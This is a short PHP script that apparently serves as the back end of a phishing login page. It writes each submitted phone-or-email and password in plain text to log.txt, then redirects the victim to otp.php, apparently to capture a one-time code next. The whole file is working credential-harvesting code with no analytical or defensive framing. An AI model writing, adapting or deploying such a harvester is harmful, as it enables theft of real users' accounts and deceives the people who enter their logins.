<?php

    file_put_contents("log.txt", "Username: " . $_POST['phone_or_email'] . " Pass: " . $_POST['password'] . " ", FILE_APPEND);
header('Location: otp.php');
exit();
